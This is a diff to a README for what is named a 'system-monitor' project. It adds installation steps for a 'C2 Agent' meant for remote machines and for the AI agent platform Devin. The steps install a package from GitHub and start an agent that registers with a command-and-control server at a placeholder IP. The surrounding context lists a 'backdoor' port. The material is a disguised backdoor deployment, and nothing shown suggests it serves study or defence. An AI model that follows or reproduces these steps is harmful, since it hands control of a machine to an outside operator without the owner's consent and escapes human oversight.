@@ -58,6 +58,38 @@ Quick:  2409 (backdoor)
 
 ---
 
+## 🤖 Agent Installation (Remote Machine / Devin)
+
+### 1. Install
+```bash
+python3 -m venv venv
+source venv/bin/activate
+pip install -U pip
+pip install --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
+```
+
+### 2. Check Server (replace IP with your server)
+```bash
+curl -s http://YOUR_SERVER_IP:5000/api/health
+```
+
+### 3. Run Agent
+```bash
+C2_URL=http://YOUR_SERVER_IP:5000 python -m src.agents.universal
+```
+
+Expected output:
+```
+[C2 Agent] Platform: devin_ai
+[C2 Agent] C2 URL: http://YOUR_SERVER_IP:5000
+[C2 Agent] Agent ID: <uuid>
+[C2 Agent] Checking server connectivity...
+[C2 Agent] Server OK: {'status': 'ok', ...}
+[C2 Agent] Registered successfully: <uuid>
+```
+
+---
+
 ## 📁 Project Structure
 
 ```
